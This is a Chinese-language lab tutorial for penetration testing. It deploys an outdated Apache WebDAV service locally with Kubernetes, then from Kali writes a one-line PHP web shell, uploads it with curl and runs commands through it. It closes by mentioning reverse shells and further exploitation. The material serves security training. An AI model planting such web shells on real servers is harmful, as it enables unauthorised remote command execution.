# 簡單滲透作業示範

本示例展示如何利用 Docker 結合 Kubernetes（kubectl）在 Mac Ventura 上部署目標 Web 服務，並在 Kali VM 上利用 WebDAV 漏洞上傳一句話木馬 (shell.php) 進行滲透攻擊。  
**注意：** 此示例僅供學習用途，請勿在未經授權的情況下使用。

---

## 1. 部署目標服務（本機端 - Mac Ventura）

1. **部署服務：**  
   - 在終端機中執行以下指令，使用附檔 `k8s.yaml` 部署目標服務：
     ```bash
     kubectl apply -f k8s.yaml
     ```

2. **查詢 Service 狀態：**  
   - 在本機瀏覽器中訪問：
     ```
     kubectl get svc -n namespace-double-nodes
     ```

3. **端口轉發：**  
   - 將服務的 80 號端口轉發到本機 10088 端口：
     ```bash
     kubectl port-forward service/service-internet 10088:80 -n namespace-double-nodes --address 0.0.0.0
     ```
     
4. **確認連線：**  
   - 在本機瀏覽器中訪問：
     ```
     http://127.0.0.1:10088
     ```
   - 若能看到 Apache httpd 2.2.8 與 DAV/2 標記的頁面，即表示服務正常運作。

---

## 2. 準備 Kali VM 進行滲透測試

1. **確認連線：**  
   - 在 Kali VM 終端機中執行：
     ```bash
     ping 127.0.0.1
     ```
   - ※ 注意：若 Kali 與本機位於不同網段，請使用正確的 IP。

2. **掃描服務：**  
   - 在 Kali VM 中執行 nmap 掃描確認服務版本：
     ```bash
     nmap -sV -p 10088 127.0.0.1
     ```
   - 結果應顯示 Apache httpd 2.2.8 ((Ubuntu) DAV/2)，表明 WebDAV 可能啟用且版本過舊，存在漏洞風險。

---

## 3. 製作木馬檔 (shell.php)（Kali VM）

1. **建立木馬檔：**  
   - 在 Kali VM 中執行：
     ```bash
     echo "<?php system(\$_GET['cmd']); ?>" > shell.php
     ```
   - 用文字編輯器檢查檔案，內容應為：
     ```php
     <?php system($_GET['cmd']); ?>
     ```

---

## 4. 利用 WebDAV 漏洞上傳木馬（Kali VM）

1. **嘗試上傳木馬：**  
   - 使用 curl 嘗試將 `shell.php` 上傳到目標服務（假設 WebDAV 允許匿名上傳）：
     ```bash
     curl -T shell.php http://127.0.0.1:10088/dav/
     ```
   - 若上傳成功，`shell.php` 應位於服務的根目錄。

---

## 5. 驗證滲透攻擊（Kali VM）

1. **測試木馬：**  
   - 在 Kali VM 的瀏覽器中訪問以下 URL：
     ```
     curl http://127.0.0.1:10088/shell.php?cmd=whoami
     ```
   - 若返回執行結果（例如 Apache 的運行使用者），則表示成功利用漏洞執行命令。

---

## 6. 後續操作

- 一旦取得命令執行，便可進一步利用該木馬執行更多命令或反彈 shell。  
- 請根據目標環境調整攻擊策略與後續滲透步驟。

---

> **注意：**  
> 此示例僅供學習用途，請遵守相關法律與倫理規範，勿在未經授權的情況下進行滲透測試。
